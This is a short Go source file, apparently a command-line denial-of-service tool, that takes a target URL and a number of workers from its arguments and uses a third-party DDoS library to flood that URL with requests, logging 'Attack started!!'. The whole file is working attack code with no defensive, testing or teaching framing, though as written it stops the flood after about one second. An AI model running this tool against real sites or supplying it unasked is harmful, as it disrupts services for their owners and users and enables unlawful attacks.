package main

import (
	"log"
	"os"
	"strconv"
	"time"

	ddos "github.com/Konstantin8105/DDoS"
)

func main() {
	url := os.Args[1]
	workers, err := strconv.Atoi(os.Args[2])

	if err != nil {
		log.Fatalf("Invalid workers number!")
	}

	start(url, workers)
}

func start(url string, workers int) {
	log.Println("Attack started!! URL=" + url + " WORKERS=" + strconv.Itoa(workers))
	log.Println("Press CTRL + c to exit.")
	d, err := ddos.New(url, workers)
	if err != nil {
		panic(err)
	}
	d.Run()
	time.Sleep(time.Second)
	d.Stop()
}
